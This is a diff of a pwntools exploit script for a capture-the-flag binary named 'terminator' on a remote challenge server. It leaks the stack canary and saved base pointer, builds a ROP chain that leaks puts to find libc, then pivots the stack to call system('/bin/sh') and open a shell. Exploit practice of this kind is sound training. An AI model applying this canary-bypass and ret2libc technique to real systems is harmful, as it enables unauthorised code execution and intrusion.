@@ -1,54 +1,90 @@
+#!/usr/bin/env python3
+
 from pwn import *
 
-libc = ELF("./binaries/libc.so.6", checksec=False)
-libc.address = 0
-elf = ELF("./binaries/terminator_patched", checksec=False)
-r = remote("terminator.challs.olicyber.it", 10307)
-# r = process("./binaries/terminator")
+elf = ELF("./terminator_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
 
-def leak_canary_rbp(r, n):
-    payload = b"a" * n
-    r.sendlineafter(b"> ", payload)
+context.binary = elf
+
+def conn():
+    if args.REMOTE:
+        r = remote("terminator.challs.olicyber.it", 10307)
+    else:
+        r = process([elf.path])
+
+    return r
+
+
+def main():
+    r = conn()
+
+    r.sendafter(b'> ', b'a'*56)
     r.recvline()
+    
+    leak = r.recvuntil(b'Nice to meet you!', drop=True)
+    canary = u64(leak[:7].rjust(8, b'\x00'))
+    rbp = u64(leak[7:].ljust(8, b'\x00'))
+    current_rbp = rbp - 0x20
+    
+    if(rbp == 0):
+        log.error("Rerun")
+        exit(1)
+    
+    log.success(f"Canary: {hex(canary)}")
+    log.success(f"RBP: {hex(rbp)}")
+    log.success(f"Current RBP: {hex(current_rbp)}")
+    
+    payload = flat([
+        0x401016,  # ret;
+        0x4012fb,  # pop rdi; ret;
+        elf.got['puts'],
+        elf.plt['puts'],
+        elf.sym['main'],
+        b'a' * 16,
+        canary,
+        current_rbp - 0x48,
+        ])
+    
+    r.sendafter(b'> ', payload)
+    
+    r.recvline()
+    puts_addr = u64(r.recvline().strip().ljust(8, b'\x00'))
+    libc.address = puts_addr - libc.sym['puts']
 
-    leaked_bytes = r.recvuntil(b"Nice").replace(b"Nice", b"").strip()
+    log.success(f"puts_addr: {hex(puts_addr)}")
+    log.success(f"libc base: {hex(libc.address)}")
+    
+    r.sendafter(b'> ', b'a'*56)
+    r.recvline()
+    
+    leak = r.recvuntil(b'Nice to meet you!', drop=True)
+    rbp = u64(leak[7:].ljust(8, b'\x00'))
+    current_rbp = rbp - 0x20
+    
+    if(rbp == 0):
+        log.error("Rerun")
+        exit(1)
+    
+    log.success(f"RBP: {hex(rbp)}")
+    log.success(f"Current RBP: {hex(current_rbp)}")
+        
+    payload = flat([
+        b'/bin/sh\x00',
+        0x401016,  # ret;
+        0x4012fb,  # pop rdi; ret;
+        current_rbp - 0x40,
+        libc.sym['system'], 
+        b'a' * 16,
+        canary,
+        current_rbp - 0x40,
+    ])
+    
+    r.sendafter(b'> ', payload)
+    
+    r.interactive()
 
-    canary_raw = b"\x00" + leaked_bytes[:7]
-    rbp_raw    = leaked_bytes[7:15].ljust(8, b"\x00")
-    canary = u64(canary_raw)
-    rbp    = u64(rbp_raw)
 
-    return canary, rbp
-
-canary, rbp = leak_canary_rbp(r, 55)
-print(hex(canary))
-print(hex(rbp))
-
-pop_rdi   = 0x4012fb
-ret       = 0x401016
-leave_ret = 0x4011cc
-
-puts_got = elf.got["puts"]
-puts_plt = elf.plt["puts"]
-
-payload  = p64(ret)
-payload += p64(pop_rdi)
-payload += p64(puts_got)
-payload += p64(puts_plt)
-payload += p64(elf.symbols["main"])
-payload  = payload.ljust(56, b"a")
-payload += p64(canary)
-payload += p64(rbp - 0x68)
-
-
-r.sendlineafter(b"> ", payload)
-r.recvline()
-puts_raw = r.recvline().strip().ljust(8, b"\x00")
-puts_addr = u64(puts_raw)
-
-libc_base = puts_addr - libc.symbols["puts"]
-
-bin_sh = libc_base + next(libc.search(b"/bin/sh"))
-system = libc_base + libc.symbols["system"]
-
-r.interactive()
+if __name__ == "__main__":
+    main()
